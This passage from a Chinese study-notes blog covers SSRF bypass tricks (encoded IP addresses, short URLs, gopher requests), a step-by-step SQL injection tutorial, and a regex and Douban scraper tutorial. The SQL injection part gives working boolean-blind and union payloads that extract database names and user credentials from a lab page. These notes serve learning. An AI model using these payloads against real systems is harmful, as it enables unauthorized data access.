class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="•绕过协议"><a href="#•绕过协议" class="headerlink" title="•绕过协议"></a>•绕过协议</h3><h5 id="1-ip地址转换绕过"><a href="#1-ip地址转换绕过" class="headerlink" title="1.ip地址转换绕过"></a>1.ip地址转换绕过</h5><p>192.168.0.1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1)、8进制格式：0300.0250.0.1</span><br><span class="line">(2)、16进制格式：0xC0.0xA8.0.1</span><br><span class="line">(3)、10进制整数格式：3232235521</span><br><span class="line">(4)、16进制整数格式：0xC0A80001</span><br></pre></td></tr></table></figure>

<h5 id="2-短网址绕过"><a href="#2-短网址绕过" class="headerlink" title="2.短网址绕过"></a>2.短网址绕过</h5><p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201120215420079.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201120215444639.png"></p>
<p>​     即<a target="_blank" rel="noopener" href="http://www.baidu.com与http//x8r.cn/uhOYzn">www.baidu.com与http://x8r.cn/uhOYzn</a> 是一样的</p>
<h5 id="3-gopher协议"><a href="#3-gopher协议" class="headerlink" title="3.gopher协议"></a>3.gopher协议</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：URL:gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure>

<p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p>
<ul>
<li>gopher的默认端口是70</li>
<li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/11/17/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06/" data-id="ckhpm2jij0000ckv33ip89gql" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记5" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/" class="article-date">
  <time datetime="2020-11-14T16:00:00.000Z" itemprop="datePublished">2020-11-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/">SQL注入</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>#SQL注入的概述</p>
<p>定义：SQL注入即是指web应用程序对用户输入数据的合法性没有判断，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
<p>#SQL注入的类型</p>
<p>1.布尔盲注</p>
<p>2.union注入</p>
<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="*布尔盲注"></a>*布尔盲注</h4><p>布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 <code>true</code> 、 <code>false</code>使web页面返回true或者false，从而达到注入的目的来获取信息</p>
<ul>
<li>ascii() 函数，返回字符ascii码值   <ul>
<li>参数 : <code>str</code>单字符</li>
</ul>
</li>
<li>length() 函数，返回字符串的长度   <ul>
<li>参数 : <code>str</code> 字符串</li>
</ul>
</li>
<li>left() 函数，返回从左至右截取固定长度的字符串   <ul>
<li>参数<code>str</code>,<code>length</code></li>
<li><code>str</code> : 字符串</li>
<li><code>length</code>：截取长度</li>
</ul>
</li>
<li>substr()/substring() 函数 ， 返回从pos位置开始到length长度的子字符串   <ul>
<li>参数，<code>str</code>，<code>pos</code>，<code>length</code></li>
<li><code>str</code>: 字符串</li>
<li><code>pos</code>：开始位置</li>
<li><code>length</code>： 截取长度</li>
</ul>
</li>
</ul>
<h6 id="判断是否存在盲注"><a href="#判断是否存在盲注" class="headerlink" title="#判断是否存在盲注"></a>#判断是否存在盲注</h6><p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115110351443.png"></p>
<p>*给id赋值显示正常 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id&#x3D;1</span><br></pre></td></tr></table></figure>

<p>*输入的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are in.........</span><br></pre></td></tr></table></figure>

<p>*当给他输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115110753465.png"></p>
<p>*没有出现任何即不存在union注入</p>
<p>*当再次输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure>

<p>*输出的结果与之前的一样,显示正常,即and后面的为真</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115111019672.png"></p>
<p>*假如输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and 1&#x3D;2</span><br></pre></td></tr></table></figure>

<p> *猜测:单引号表示判断and后面的语句,1=2 为假,即输出</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115111419279.png"></p>
<p>*当输入为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and 1&#x3D;1</span><br></pre></td></tr></table></figure>

<p>*输出的为</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115111721482.png"></p>
<p>*也没有出现任何结果,即猜测错误</p>
<p>*可知 如果输入的为数字型,单引号把前面的单引号闭合,后面就会多出来一个单引号,因此我们要采用注释的方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and 1&#x3D;1--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115112306033.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id&#x3D;1&#39;and 1&#x3D;2--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115112456751.png"></p>
<p>*即确定存在sql注入</p>
<p>*用order by 查询字符段长度，长度为3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;order by 3--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115112839178.png"></p>
<p>*使用union查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;union select 1,12,3--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115120438808.png"></p>
<p>*再输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;union select 1,user(),3--+</span><br></pre></td></tr></table></figure>

<p>能发现查询的user()能在数据库里面正常运行，但在页面返回是看不到的</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115120752304.png"></p>
<p>*因此需要用到布尔盲注</p>
<p>*获取数据库的长度（使用到length函数）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and(length(database()))--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115121419317.png"></p>
<p>*运行正常</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and(length(database()))&gt;5--+</span><br></pre></td></tr></table></figure>

<p>*根据length函数，可知数据库的长度大于5，可根据这种方法测试出数据库长度</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115123824774.png"></p>
<p>*获取数据库的名字（使用到substr函数、ascii函数）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id&#x3D;1&#39;and substr(database(),1,1)--+</span><br></pre></td></tr></table></figure>

<p>*(database(),1,1):“1，1”表示从数据库名字第一位开始，取出一位数据</p>
<p>使用ascii对取出来的数据进行比较</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and ascii(substr(database(),1,1))&gt;1--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115125343574.png"></p>
<p>*获取表的数量（count函数、information_schema）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and (select count(*)from information_schema.tables where table_schema&#x3D;database())--+</span><br></pre></td></tr></table></figure>



<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115130520941.png"></p>
<p>*使用比较方法判断出表的数量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;and (select count(*)from information_schema.tables where table_schema&#x3D;database())&#x3D;4--+</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201115130641184.png"></p>
<h4 id="Union注入"><a href="#Union注入" class="headerlink" title="*Union注入"></a>*Union注入</h4><p>database()：当前网站使用的数据库<br>version()：当前mysql的版本<br>user()：当前mysql的用户</p>
<h6 id="判断是否存在sql注入"><a href="#判断是否存在sql注入" class="headerlink" title="#判断是否存在sql注入"></a>#判断是否存在sql注入</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;1  --返回true，显示正常</span><br><span class="line">and 1&#x3D;2  --返回false，显示错误</span><br></pre></td></tr></table></figure>

<h6 id="union查询"><a href="#union查询" class="headerlink" title="#union查询"></a>#union查询</h6><p>*联合查询猜表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3,……,7 from users </span><br></pre></td></tr></table></figure>

<p>*联合查询猜列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,username,4,5,password,7 </span><br></pre></td></tr></table></figure>

<p>*获取数据库库名、版本号、用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,database(),version(),user(),6,7</span><br></pre></td></tr></table></figure>

<p>*得到数据库库名后查当前数据库表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select  column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;;</span><br></pre></td></tr></table></figure>

<p>*查数据，假设查到的列名分别为：id，username，password</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select username,password from table_name&#x3D;&#39;user&#39;;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/11/15/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05/" data-id="ckhj6b9y70000osv3foi1hnkl" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记4" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/10/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/" class="article-date">
  <time datetime="2020-11-09T16:00:00.000Z" itemprop="datePublished">2020-11-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/10/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/">正则提取</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="正则表达式的常用操作符"><a href="#正则表达式的常用操作符" class="headerlink" title="*正则表达式的常用操作符"></a>*正则表达式的常用操作符</h3><table>
<thead>
<tr>
<th align="center">操作符</th>
<th align="center">说明</th>
<th align="center">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="center">.</td>
<td align="center">表示任何单个字符</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">[  ]</td>
<td align="center">字符集，对单个字符给出范围取值范围</td>
<td align="center">[abc]表示a、b、c, [a-z]表示a到z单个字符</td>
</tr>
<tr>
<td align="center">[^  ]</td>
<td align="center">非字符集，对单个字符给出排除范围</td>
<td align="center">[^abc]表示非a或b或c的单个字符</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">前一个字符0次或无限次扩展</td>
<td align="center">abc*表示ab、abc、abcc、abccc等</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">前一个字符1次或无限次扩展</td>
<td align="center">abc+表示abc、abcc、abccc等</td>
</tr>
<tr>
<td align="center">？</td>
<td align="center">前一个字符0次或1次扩展</td>
<td align="center">abc?表示ab、abc</td>
</tr>
<tr>
<td align="center">|</td>
<td align="center">左右表达式任意一个</td>
<td align="center">abc|def 表示abc、def</td>
</tr>
<tr>
<td align="center">{m}</td>
<td align="center">扩展前一个字符m次</td>
<td align="center">ab{2}c表示abbc</td>
</tr>
<tr>
<td align="center">{m,n}</td>
<td align="center">扩展前一个字符m至n次（含n）</td>
<td align="center">ab{1,2}c表示abc、abbc</td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">匹配字符串开头</td>
<td align="center">^abc表示abc且在一个字符串的开头</td>
</tr>
<tr>
<td align="center">$</td>
<td align="center">匹配字符串结尾</td>
<td align="center">abc$表示abc且在一个字符串的结尾</td>
</tr>
<tr>
<td align="center">（ ）</td>
<td align="center">分组标记，内部只能用 | 操作符</td>
<td align="center">（abc）表示abc , (abc|def)表示abc、def</td>
</tr>
<tr>
<td align="center">\d</td>
<td align="center">数字，等价于[0-9]</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">\w</td>
<td align="center">单词字符，等价于[A-Za-z0-9]</td>
<td align="center"></td>
</tr>
</tbody></table>
<h3 id="Re库主要功能函数"><a href="#Re库主要功能函数" class="headerlink" title="*Re库主要功能函数"></a>*Re库主要功能函数</h3><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">re.search()</td>
<td align="center">在一个字符串中搜索匹配正则表达式的第一个位置，返回match对象</td>
</tr>
<tr>
<td align="center">re.match()</td>
<td align="center">从一个字符串的开始位置起匹配正则表达式，返回match对象</td>
</tr>
<tr>
<td align="center">re.findall()</td>
<td align="center">搜索字符串，以列表类型返回全部匹配的子串</td>
</tr>
<tr>
<td align="center">re.split()</td>
<td align="center">将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</td>
</tr>
<tr>
<td align="center">re.findter()</td>
<td align="center">搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</td>
</tr>
<tr>
<td align="center">re.sub()</td>
<td align="center">在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</td>
</tr>
</tbody></table>
<h6 id="正则表达式可以包含一些可选标志修饰符来控制匹配的模式，修饰符被指定未一个可选的标志，多个标志可以通过按位OR（-）它们来指定。如re-I-re-M被设置成-I-和-M-标志："><a href="#正则表达式可以包含一些可选标志修饰符来控制匹配的模式，修饰符被指定未一个可选的标志，多个标志可以通过按位OR（-）它们来指定。如re-I-re-M被设置成-I-和-M-标志：" class="headerlink" title="*正则表达式可以包含一些可选标志修饰符来控制匹配的模式，修饰符被指定未一个可选的标志，多个标志可以通过按位OR（|）它们来指定。如re.I|re.M被设置成  I 和 M  标志："></a>*正则表达式可以包含一些可选标志修饰符来控制匹配的模式，修饰符被指定未一个可选的标志，多个标志可以通过按位OR（|）它们来指定。如re.I|re.M被设置成  I 和 M  标志：</h6><table>
<thead>
<tr>
<th align="center">修饰符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">re.I</td>
<td align="center">使匹配对大小写不敏感</td>
</tr>
<tr>
<td align="center">re.L</td>
<td align="center">使本地化识别（locate-aware）匹配</td>
</tr>
<tr>
<td align="center">re.M</td>
<td align="center">多行匹配，影响^和$</td>
</tr>
<tr>
<td align="center">re.S</td>
<td align="center">使.匹配包括换行在内的所有字符</td>
</tr>
<tr>
<td align="center">re.U</td>
<td align="center">根据Unicode字符集解析字符，这个标志影响\w,\W,\b,\B</td>
</tr>
<tr>
<td align="center">re.X</td>
<td align="center">该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解</td>
</tr>
</tbody></table>
<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h4 id="正则表达式：字符串模式（判断字符串是否符合一定的标准）"><a href="#正则表达式：字符串模式（判断字符串是否符合一定的标准）" class="headerlink" title="*正则表达式：字符串模式（判断字符串是否符合一定的标准）"></a>*正则表达式：字符串模式（判断字符串是否符合一定的标准）</h4><p>#引入模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br></pre></td></tr></table></figure>

<p>*创建模式对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pat &#x3D; re.compile(&quot;AA&quot;) </span><br></pre></td></tr></table></figure>

<p>*此处AA是正则表达式，用来去验证其他的字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pat.search(&quot;CBA&quot;)</span><br></pre></td></tr></table></figure>

<p>*search字符串被校验的内容</p>
<h6 id="全部代码"><a href="#全部代码" class="headerlink" title="*全部代码"></a>*全部代码</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">pat &#x3D; re.compile(&quot;AA&quot;)   </span><br><span class="line">m &#x3D;pat.search(&quot;CBA&quot;) </span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>*运行结果</p>
<p>*None:表示没有找到能够匹配的字符串</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201108224356860.png"></p>
<p>*又如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">pat &#x3D; re.compile(&quot;AA&quot;)   </span><br><span class="line">m &#x3D;pat.search(&quot;ABCAA&quot;) </span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>*运行结果</p>
<p>*匹配到的字符串在（3，5）下标处，（3，5）集合为左闭右开，因此匹配到的字符串在第3、4下标处。</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201108231504129.png"></p>
<p>*例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">pat &#x3D; re.compile(&quot;AA&quot;)  </span><br><span class="line">m &#x3D;pat.search(&quot;AABCAADDCCAAA&quot;) </span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>*search方法，进行比对查找，只能找到第一个字符串位置</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201108232222675.png"></p>
<p>#没有模式对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">m &#x3D; re.search(&quot;asd&quot;,&quot;Aasd&quot;)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>*前面的字符串是规则（模板）—“asd”，后面的字符串是被校验的对象—“Aasd”</p>
<p>*运行结果</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201108233329120.png"></p>
<p>#re.findall()</p>
<p>*一个字母一个字母匹配</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">print(re.findall(&quot;[A-Z]&quot;, &quot;AsdsdfaQa&quot;))</span><br></pre></td></tr></table></figure>

<p>*re.findall(“规矩”，“校验的对象”)</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201108234336841.png"></p>
<p>*组合输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">print(re.findall(&quot;[A-Z]+&quot;, &quot;ASDsdfQWEaQa&quot;))</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201108235005131.png"></p>
<p>#re.sub()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">print(re.sub(&quot;a&quot;,&quot;A&quot;,&quot;aasdhefuigewadsh&quot;))</span><br></pre></td></tr></table></figure>

<p>*”a”表示在校验对象中的字符，“A”表示将”a”替换成”A”</p>
<p>*输出结果</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201108235525101.png"></p>
<p>#要点：建议在正则表达式中，被比较的字符串前面加上r,不用担心转义字符的问题，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">a&#x3D;r&quot;\aasdsf-\&#39;&quot;</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201109000000621.png"></p>
<h4 id="正则提取"><a href="#正则提取" class="headerlink" title="*正则提取"></a>*正则提取</h4><p>*源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import urllib.request,urllib.error  </span><br><span class="line">from bs4 import BeautifulSoup  </span><br><span class="line">def main():</span><br><span class="line">    baseurl &#x3D;&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;&quot;</span><br><span class="line">    datalist&#x3D;getData(baseurl)</span><br><span class="line">    savepath &#x3D;&quot;.\\豆瓣电影TOP250.xls&quot;</span><br><span class="line">    #saveData(savepath)</span><br><span class="line"></span><br><span class="line">    #askURL(&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;0&quot;)</span><br><span class="line"></span><br><span class="line">def getData(baseurl):</span><br><span class="line">    datalist&#x3D;[]</span><br><span class="line">    for i in range(0, 10):   </span><br><span class="line">        url &#x3D; baseurl + str(i * 25)</span><br><span class="line">        html &#x3D; askURL(url)  </span><br><span class="line">        soup&#x3D;BeautifulSoup(html,&quot;html.parser&quot;)</span><br><span class="line">        for item in soup.find_all(&#39;div&#39;,class_&#x3D;&quot;item&quot;): </span><br><span class="line">           print(item)</span><br><span class="line">    return  datalist</span><br><span class="line">def askURL(url):</span><br><span class="line"></span><br><span class="line">   head &#x3D;&#123;      </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko&#x2F;20100101 Firefox&#x2F;82.0&quot;&#125;</span><br><span class="line">   request &#x3D; urllib.request.Request(url,headers&#x3D;head)</span><br><span class="line">   html &#x3D; &quot;&quot;</span><br><span class="line">   try:</span><br><span class="line">       response &#x3D; urllib.request.urlopen(request)</span><br><span class="line">       html &#x3D; response.read().decode(&quot;utf-8&quot;)</span><br><span class="line">       # print(html)</span><br><span class="line">   except urllib.error.URLError as e:</span><br><span class="line">       if hasattr(e,&quot;code&quot;):</span><br><span class="line">           print(e.code)</span><br><span class="line">       if hasattr(e,&quot;reason&quot;):</span><br><span class="line">            print(e.reason)</span><br><span class="line">   return html</span><br><span class="line"></span><br><span class="line">def saveData(savepath):</span><br><span class="line">   print(&quot;save...&quot;)</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:  </span><br><span class="line">     main()</span><br></pre></td></tr></table></figure>

<p>*爬取到的内容为豆瓣top250 电影的内容</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201109131801726.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201109131856192.png"></p>
<p>*使用 re</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br></pre></td></tr></table></figure>

<p>*在主函数中定义一个正则提取的规则，创建对象如：</p>
<p>1.查找链接规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findlink &#x3D; re.compile(r&#39;&lt;a href&#x3D;&quot;(.*?)&quot;&gt;&#39;)   </span><br></pre></td></tr></table></figure>

<p>*全部代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import re   </span><br><span class="line">import urllib.request,urllib.error </span><br><span class="line">from bs4 import BeautifulSoup   </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    baseurl &#x3D;&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;&quot;</span><br><span class="line">    datalist&#x3D;getData(baseurl)</span><br><span class="line">    savepath &#x3D;&quot;.\\豆瓣电影TOP250.xls&quot;</span><br><span class="line">    #saveData(savepath)</span><br><span class="line">findlink &#x3D; re.compile(r&#39;&lt;a href&#x3D;&quot;(.*?)&quot;&gt;&#39;)</span><br><span class="line">    #askURL(&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;0&quot;)</span><br><span class="line">def getData(baseurl):</span><br><span class="line">    datalist&#x3D;[]</span><br><span class="line">    for i in range(0,25):  </span><br><span class="line">        url &#x3D; baseurl + str(i*25)</span><br><span class="line">        html &#x3D; askURL(url) </span><br><span class="line">        soup&#x3D;BeautifulSoup(html,&quot;html.parser&quot;)</span><br><span class="line">        for item in soup.find_all(&#39;div&#39;,class_&#x3D;&quot;item&quot;): </span><br><span class="line">         data &#x3D;  [] </span><br><span class="line">         item &#x3D; str(item)</span><br><span class="line">         link &#x3D; re.findall(findlink, item)[0]</span><br><span class="line">        print(link)</span><br><span class="line">    return  datalist</span><br><span class="line">def askURL(url):</span><br><span class="line"></span><br><span class="line">   head 